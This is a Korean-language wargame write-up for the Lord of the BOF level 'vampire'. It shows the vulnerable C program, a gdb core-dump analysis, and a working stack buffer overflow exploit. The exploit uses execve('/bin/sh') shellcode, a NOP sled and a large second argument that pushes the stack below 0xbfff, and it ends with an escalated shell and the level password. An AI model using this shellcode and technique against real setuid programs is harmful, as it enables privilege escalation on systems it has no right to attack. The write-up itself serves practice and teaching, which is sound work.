---
title: "[LOB]Level09. vampire"
tags: [Wargame, LOB, Write-up]
author: eli_ez3r
key: 20180829
modify_date: 2019-10-14
article_header:
  type: cover
  image:
    src: 
---

[Check 0xBFFF](#){:.button.button--outline-success.button--pill}

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - vampire
        - check 0xbfff
*/
#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
	char buffer[40];

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

    // here is changed!
    if(argv[1][46] == '\xff')
    {
        printf("but it's not forever\n");
        exit(0);
    }

	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);
}
```

-----

### 0x01. Analysis

RET 주소의 2번째 값이 '\xff'이면 안된다..;;

그외에는 별거 없다.



스택에서 버프의 위치가 0xbfff 영역에 존재하기 때문에 필터링에 걸릴 수 밖에 없다.

따라서 argv[2]의 많은 값의 데이터를 넣어서 버퍼의 주소가 0xbfff영역을 벗어나게 만들어야 한다.



```
[troll@localhost troll]$ ./aampire `python -c 'print "\x90"*44+"\xff\xff\xbf\xbf"'` `python -c 'print "\x90"*70000'`

릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱옜
Segmentation fault (core dumped)
```

```
[troll@localhost troll]$ gdb -c core -q
Core was generated by `./aampire 릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱옜 릱릱릱릱릱릱릱릱릱릱'.
Program terminated with signal 11, Segmentation fault.
#0  0xbfbfffff in ?? ()
(gdb) x/4x $esp
0xbffeeb50:     0x00000000      0xbffeeb94      0xbffeeba4      0x40013868
```

argv[2]에 NULL값을 70000개 넣었더니 esp값이 0xbffexxxx 영역을 가리키고 있는 것을 확인하였다.



```
(gdb) x/100x $esp
=====================================(생략)================================
0xbffeec80:     0x00000000      0x38366900      0x2f2e0036      0x706d6161
0xbffeec90:     0x00657269      0x90909090      0x90909090      0x90909090
0xbffeeca0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffeecb0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffeecc0:     0xbfbfffff      0x90909000      0x90909090      0x90909090
0xbffeecd0:     0x90909090      0x90909090      0x90909090      0x90909090
(gdb)
```

그리고 실제 Shell Code가 올라가는 주소는 `0xbffeeca0` 근처 인것도 확인하였다.

-----

### 0x02. Exploit

```
shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

```
[troll@localhost troll]$ ./vampire `python -c 'print "\x90"*20+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e \x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\xa0\xec\xfe\xbf"'` `python -c 'print "\x90"*70000'`
릱릱릱릱릱릱릱릱릱릱1픐h//shh/bin됥PS됣솻
                                         ?좎
bash$ id
uid=508(troll) gid=508(troll) euid=509(vampire) egid=509(vampire) groups=508(troll)
bash$ my-pass
euid = 509
music world
```

-----

